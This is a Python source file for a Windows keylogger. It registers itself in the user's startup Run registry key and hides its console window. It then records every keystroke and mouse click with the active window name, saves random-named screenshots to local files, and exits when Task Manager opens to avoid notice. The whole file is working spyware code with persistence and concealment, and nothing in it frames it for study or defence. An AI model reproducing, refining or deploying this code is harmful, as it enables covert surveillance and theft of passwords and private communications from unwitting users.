#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import win32api, pythoncom
import pyHook, os, time, random, string
import winreg
import ctypes

global t, start_time, pics_names, interval

t = ""
pics_names = []


try:
    f = open('Logfile.txt', 'a')
    f.close()
except:
    f = open('Logfile.txt', 'w')
    f.close()


def addStartup():
    # this will add the file to the startup registry key
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key2change, 'Im not a keylogger', 0, winreg.REG_SZ, new_file_path)


def Hide():
    import win32console
    import win32gui

    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


addStartup()
Hide()


def ScreenShot():
    global pics_names
    import pyautogui

    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))

    name = str(generate_name())
    pics_names.append(name)
    pyautogui.screenshot().save(name + '.png')


def is_task_manager_open():
    # Check if Task Manager window is open
    import win32gui

    try:
        hwnd = win32gui.FindWindow(None, "Task Manager")
        return hwnd != 0
    except:
        return False


def OnMouseEvent(event):
    global interval, t, start_time, pics_names
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
           + ' WindowName : ' + str(event.WindowName)
    data += '\n\tButton:' + str(event.MessageName)
    data += '\n\tClicked in (Position):' + str(event.Position)
    data += '\n===================='

    t = t + data

    if len(t) > 300:
        ScreenShot()

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        # You can add custom actions here if needed
        start_time = time.time()
        t = ''

    return True


def OnKeyboardEvent(event):
    global interval, t, start_time
    data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
           + ' WindowName : ' + str(event.WindowName)
    data += '\n\tKeyboard key :' + str(event.Key)
    data += '\n===================='

    t = t + data

    if len(t) > 500:
        f = open('Logfile.txt', 'a')
        f.write(t)
        f.close()
        t = ''

    if int(time.time() - start_time) == int(interval):
        # You can add custom actions here if needed
        start_time = time.time()
        t = ''

    if is_task_manager_open():
        # Perform cleanup and exit the script when Task Manager is open
        f = open('Logfile.txt', 'a')
        f.write("\n[Script terminated: Task Manager is open]\n")
        f.close()
        sys.exit()

    return True


hook = pyHook.HookManager()

hook.KeyDown = OnKeyboardEvent
hook.MouseAllButtonsDown = OnMouseEvent

hook.HookKeyboard()
hook.HookMouse()

start_time = time.time()

pythoncom.PumpMessages()
